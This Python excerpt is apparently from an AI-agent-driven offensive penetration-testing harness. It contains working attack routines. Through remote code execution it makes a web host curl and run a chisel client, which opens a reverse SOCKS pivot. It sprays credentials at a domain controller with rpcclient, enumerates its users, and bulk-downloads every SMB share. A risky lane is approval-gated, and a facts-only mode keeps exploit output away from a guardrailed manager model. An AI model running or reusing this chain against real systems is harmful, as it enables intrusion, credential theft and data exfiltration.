        sh(f"cd {WORK}&&setsid python3 -m http.server {HTP} >/tmp/gbhs.log 2>&1 </dev/null &", 8)
        sh(f"setsid {CHISEL} server --reverse -p {CHP} >/tmp/gbchs.log 2>&1 </dev/null &", 8)
        time.sleep(2)
        for _ in range(3):                        # web pulls the chisel client (verify size)
            pull = self._rce(f"rm -f /tmp/.gbch;curl -s -m 8 -o /tmp/.gbch http://{gw}:{HTP}/chisel;"
                             f"chmod +x /tmp/.gbch;stat -c%s /tmp/.gbch 2>/dev/null")
            if any(int(x) > 100000 for x in re.findall(r"\d+", pull)):
                break
            time.sleep(1)
        self._rce(f"setsid /tmp/.gbch client {gw}:{CHP} R:{SKP}:socks >/tmp/.gbchl 2>&1 </dev/null & echo go")
        conf = f"{WORK}/pc.conf"
        sh(f"printf '[ProxyList]\\nsocks5 127.0.0.1 {SKP}\\n' > {conf}", 6)
        for _ in range(12):
            if "UP" in sh(f"timeout 3 bash -c 'echo >/dev/tcp/127.0.0.1/{SKP}' && echo UP || echo DOWN", 5):
                self.socks_up = True; self._pc = f"proxychains4 -q -f {conf} "
                return True
            time.sleep(1)
        return False

    def _spray_dc(self, dc, pc, lane_id):
        """Guest-proof credential spray at the DC/file-server (optionally through proxychains).
        rpcclient getusername is authenticated-only: 'Account Name: <u>' == real login."""
        cmds, facts, out = [], [], ""
        spray, seen = [], set()
        for u, p in list(self.creds) + DEFAULT_CREDS:
            if (u, p) not in seen:
                seen.add((u, p)); spray.append((u, p))
        for u, p in spray:
            up = _q(f"{u}%{p}")
            cmds.append(f"{pc}rpcclient -U {u}%*** {dc} getusername")
            r = sh(f"{pc}rpcclient -U {up} {dc} -c 'getusername;enumdomusers' 2>&1", 25)
            out += f"\n$ {u}\n" + r
            if re.search(rf"Account Name:\s*{re.escape(u)}\b", r, re.I) and "nobody" not in r.lower():
                facts.append(f"dc_cred={u}:{p}")
                users = re.findall(r"user:\[([^\]]+)\]", r)
                sh("mkdir -p /tmp/gb-dc", 6)
                ls = sh(f"{pc}smbclient -L //{dc} -U {up} 2>&1", 18); out += ls
                for s in re.findall(r"^\s*(\w[\w$.-]*)\s+Disk", ls, re.M):
                    if s.endswith("$"):
                        continue
                    d = sh(f"{pc}smbclient //{dc}/{s} -U {up} "
                           f"-c 'recurse ON;prompt OFF;lcd /tmp/gb-dc;mget *' 2>&1; "
                           f"grep -rIh . /tmp/gb-dc 2>/dev/null", 20)
                    self._flags(d, facts); out += d
                return self._v(lane_id, True,
                               f"DC owned as {u}{' via pivot' if pc else ''} (users: {','.join(users[:6])})",
                               facts, out, cmds)
        return self._v(lane_id, False, "DC spray exhausted" + (" (pivot)" if pc else ""), facts, out, cmds)

    def _owndc(self, lane):
        """Own the internal DC/file-server. Try DIRECT auth first; if 445 isn't reachable, stand
        up the chisel pivot and spray through proxychains. Defers to the trooper only if there's
        no DC discovered and no pivot available."""
        dc = self.data.get("dc_ip")
        if not dc:
            return None                          # DC not discovered by loot -> trooper fallback
        reach = sh(f"timeout 3 bash -c 'echo >/dev/tcp/{dc}/445' && echo OPEN || echo CLOSED", 8)
        if "OPEN" in reach:
            return self._spray_dc(dc, "", lane["id"])
        if self._pivot():                        # not directly reachable -> pivot then spray
            return self._spray_dc(dc, self._pc, lane["id"])
        return None                              # no direct reach and pivot failed -> trooper

    # ---- dispatcher -------------------------------------------------------------
    # provenance gate (critique fix): the trooper may consult ONLY vetted, grounded, low-risk
    # lanes; anything else is unproven and deferred to the operator. RISKY lanes (password spray /
    # pivot — lockout + infra side effects) never run without an explicit approval token.
    PROVEN = {"ftp-anon", "dns-axfr", "smb-null", "web-enum", "wp-lfi",
              "loot-foothold", "crack-creds", "privesc"}
    RISKY = {"own-dc"}

    _MAP = {"ftp-anon": "_ftp", "dns-axfr": "_dns", "smb-null": "_smb",
            "web-enum": "_webenum", "wp-lfi": "_wplfi", "loot-foothold": "_loot",
            "crack-creds": "_crack", "own-dc": "_owndc", "privesc": "_privesc"}

    def fire(self, lane):
        """Return a deterministic verdict, or None if no recipe applies (trooper fallback).
        A CONSULTABLE cookbook entry — the trooper invokes it deliberately; the harness never
        auto-selects it. Proven-only + risky-approval gating keeps unvetted/dangerous lanes off."""
        lid = lane.get("id")
        fn = self._MAP.get(lid)
        if not fn:
            return None
        if lid in self.RISKY and os.environ.get("GB_RECIPE_APPROVE", "") not in ("1", "true", "yes"):
            return self._v(lid, False,
                           "recipe gated: risky lane (spray/pivot, lockout+infra risk) needs an "
                           "approval token (GB_RECIPE_APPROVE=1 after operator approval)", [], "", [])
        if (os.environ.get("GB_RECIPE_PROVEN_ONLY", "1") in ("1", "true", "yes")
                and lid not in self.PROVEN and lid not in self.RISKY):
            return self._v(lid, False, f"recipe '{lid}' is not in the proven set — not run", [], "", [])
        try:
            return getattr(self, fn)(lane)
        except Exception as e:
            return self._v(lid, False, f"recipe error: {e}", [], "", [])


# ---- LIBRARY INDEX (canonical: the catalog is an implementation library, NEVER a decider) ----
# available_for() is a pure INDEX over the catalog: given the observed surface it says which
# recipes COULD apply. It fires nothing, chooses nothing, and prompts nothing — the manager
# decides, the trooper pulls, the AUTOTURRET verb clears. No keyword auto-piloting anywhere.
CHEAP = {"ftp-anon", "dns-axfr", "smb-null", "web-enum"}   # low-hanging fruit, manager-clearable

# lane -> ports that prove the recipe has something to act on
_LANE_PRECOND = {
    "ftp-anon": {21},
    "dns-axfr": {53},
    "smb-null": {139, 445},
    "web-enum": {80, 443, 8000, 8080, 8443},
    "wp-lfi":    {80, 443, 8000, 8080, 8443},
}


def available_for(ports=None, lanes=None, cheap_only=True):
    """Return the recipe lane ids that apply to the observed surface. `ports` is an iterable
    of open-port ints (from the cartographer map); `lanes` restricts the query (defaults to
    all). cheap_only=True (default) keeps this to the low-hanging-fruit set the manager can
    clear with AUTOTURRET — the index for the prompt offer, not a full strategy listing."""
    lanes = set(lanes) if lanes else (CHEAP if cheap_only else set(_LANE_PRECOND))
    open_ports = set(int(p) for p in (ports or []))
    return sorted(l for l in lanes if _LANE_PRECOND.get(l, set()) & open_ports)


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default=None)
    ap.add_argument("--lane", default="web-enum")
    ap.add_argument("--list", action="store_true", help="print the PROVEN consultable lanes and exit")
    ap.add_argument("--facts-only", action="store_true",
                    help="drop raw output+cmds; emit only success/evidence/facts/id. For a "
                         "guardrailed manager that runs this as a subprocess and must never see "
                         "exploit prose in its context. (Opus's ask.)")
    a = ap.parse_args()
    if a.list:
        pass
    elif not a.target:
        ap.error("--target is required unless --list")
    if a.list:
        print(" ".join(sorted(Recipes.PROVEN)) + "  (risky, approval-gated: " + " ".join(sorted(Recipes.RISKY)) + ")")
        raise SystemExit(0)
    rx = Recipes(a.target)
    t0 = time.time()
    v = rx.fire({"id": a.lane})
    if v is not None:
        v["secs"] = round(time.time() - t0, 1)
        if getattr(a, "facts_only"):
            v = {k: v[k] for k in ("id", "success", "evidence", "facts", "secs") if k in v}
    print(json.dumps(v, indent=2))
